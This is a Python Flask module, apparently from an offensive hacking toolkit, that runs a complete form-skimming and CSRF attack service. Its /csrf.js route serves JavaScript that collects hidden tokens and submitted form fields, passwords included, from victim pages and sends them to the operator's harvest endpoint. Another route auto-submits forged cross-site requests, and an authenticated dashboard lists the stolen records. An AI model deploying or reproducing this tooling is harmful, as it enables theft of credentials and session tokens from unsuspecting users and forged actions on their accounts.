from meuk.hacksec import *  # noqa: F403
from flask import Blueprint, render_template, abort, request, jsonify
from meuk.flask.models import *  # noqa: F403
from meuk.flask.security import require_dashboard_access
from app import db
import hashlib
import json
import base64


csrf_bp = Blueprint('csrf_bp', __name__,
                    template_folder='html',
                    static_folder='static')


# 1x1 transparante GIF
_PIXEL = base64.b64decode(
    'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'
)


def _cors_headers():
    origin = request.headers.get('Origin', '*')
    return {
        'Access-Control-Allow-Origin': origin,
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Vary': 'Origin',
    }


# ---------- payload routes (geen auth) ----------

@csrf_bp.route("/csrf.js", methods=["GET", "POST"])
def csrf_js():
    appdata = db_instellingen.query.first()
    host = appdata.localhost if appdata else 'http://127.0.0.1:5000'

    pagina = '''
(function(){
  var _host = "''' + host + '''";

  function _harvest(formEl) {
    var data = {};
    data._action = formEl.action || window.location.href;
    data._method = (formEl.method || "GET").toUpperCase();
    var els = formEl.elements;
    for (var i = 0; i < els.length; i++) {
      var el = els[i];
      if (!el.name) continue;
      if (el.type === "password" || el.type === "hidden" ||
          el.type === "text" || el.type === "email" ||
          el.type === "search" || el.type === "tel" ||
          el.type === "url" || el.type === "textarea" ||
          el.type === "select-one") {
        data[el.name] = el.value;
      } else if (el.type === "checkbox" || el.type === "radio") {
        if (el.checked) data[el.name] = el.value;
      }
    }
    return data;
  }

  function _send(payload) {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", _host + "/csrf/harvest", true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(JSON.stringify(payload));
    } catch(e) {
      new Image().src = _host + "/csrf/harvest?data=" + encodeURIComponent(JSON.stringify(payload));
    }
  }

  // scan alle forms en stuur tokens/hidden fields
  var forms = document.querySelectorAll("form");
  for (var i = 0; i < forms.length; i++) {
    var f = forms[i];
    var tokens = {};
    tokens._action = f.action || window.location.href;
    tokens._method = (f.method || "GET").toUpperCase();
    tokens._type = "token_scan";
    var hidden = f.querySelectorAll('input[type="hidden"]');
    for (var j = 0; j < hidden.length; j++) {
      tokens[hidden[j].name] = hidden[j].value;
    }
    if (Object.keys(tokens).length > 3) {
      _send(tokens);
    }
  }

  // hook form submits
  document.addEventListener("submit", function(e) {
    var f = e.target;
    if (f && f.tagName === "FORM") {
      var payload = _harvest(f);
      payload._type = "form_submit";
      payload._location = window.location.href;
      _send(payload);
    }
  }, true);
})();
'''

    return pagina, 200, {
        'Content-Type': 'text/javascript',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
    }


@csrf_bp.route("/csrf/inject.html", methods=["GET"])
def csrf_inject():
    action = request.args.get('action', '')
    method = request.args.get('method', 'POST').upper()

    if not action:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

    fields = []
    for key, val in request.args.items():
        if key not in ('action', 'method'):
            fields.append(f'  <input type="hidden" name="{key}" value="{val}" />')

    fields_html = '\n'.join(fields)

    pagina = f'''<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<form id="csrf_form" action="{action}" method="{method}">
{fields_html}
  <noscript><input type="submit" value="Submit" /></noscript>
</form>
<script>document.getElementById("csrf_form").submit();</script>
</body>
</html>'''

    return pagina, 200, {'Content-Type': 'text/html'}


@csrf_bp.route("/csrf/harvest", methods=["GET", "POST", "OPTIONS"])
def csrf_harvest():
    if request.method == 'OPTIONS':
        return '', 204, _cors_headers()

    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    loc = request.headers.get('Referer', '')

    data_str = ''
    methode = 'GET'
    actie = ''

    if request.is_json:
        body = request.get_json(silent=True) or {}
        actie = body.pop('_action', '')
        methode = body.pop('_method', 'POST')
        body.pop('_type', '')
        body.pop('_location', '')
        data_str = json.dumps(body)
    elif request.args.get('data'):
        data_str = request.args.get('data')
        try:
            parsed = json.loads(data_str)
            actie = parsed.pop('_action', '')
            methode = parsed.pop('_method', 'GET')
            parsed.pop('_type', '')
            parsed.pop('_location', '')
            data_str = json.dumps(parsed)
        except (json.JSONDecodeError, AttributeError):
            pass

    if data_str:
        md5 = hashlib.md5((ip + data_str).encode()).hexdigest()
        hebben = db_csrf.query.filter_by(ip=ip, md5=md5).first()
        if hebben is None:
            record = db_csrf(
                ip=ip, agent=ua, locatie=loc,
                methode=methode, actie=actie,
                data=data_str, md5=md5,
            )
            db.session.add(record)
            db.session.commit()

    headers = _cors_headers()
    headers['Content-Type'] = 'image/gif'
    headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    return _PIXEL, 200, headers


# ---------- dashboard routes (auth) ----------

@csrf_bp.route("/dashboard/csrf", methods=["GET"])
def csrf_dashboard():
    require_dashboard_access()
    records = db_csrf.query.order_by(db_csrf.id.desc()).all()
    return render_template('csrf_dashboard.html', records=records)


@csrf_bp.route("/api/csrf/data", methods=["GET"])
def api_csrf_data():
    require_dashboard_access()
    records = db_csrf.query.order_by(db_csrf.id.desc()).all()
    return jsonify([{
        'id': r.id,
        'datum': r.datum.isoformat() if r.datum else None,
        'ip': r.ip,
        'agent': r.agent,
        'locatie': r.locatie,
        'methode': r.methode,
        'actie': r.actie,
        'data': r.data,
    } for r in records])


@csrf_bp.route("/api/csrf/<int:record_id>", methods=["DELETE"])
def api_csrf_delete(record_id):
    require_dashboard_access()
    record = db.session.get(db_csrf, record_id)
    if not record:
        return jsonify({'error': 'not found'}), 404
    db.session.delete(record)
    db.session.commit()
    return '', 204
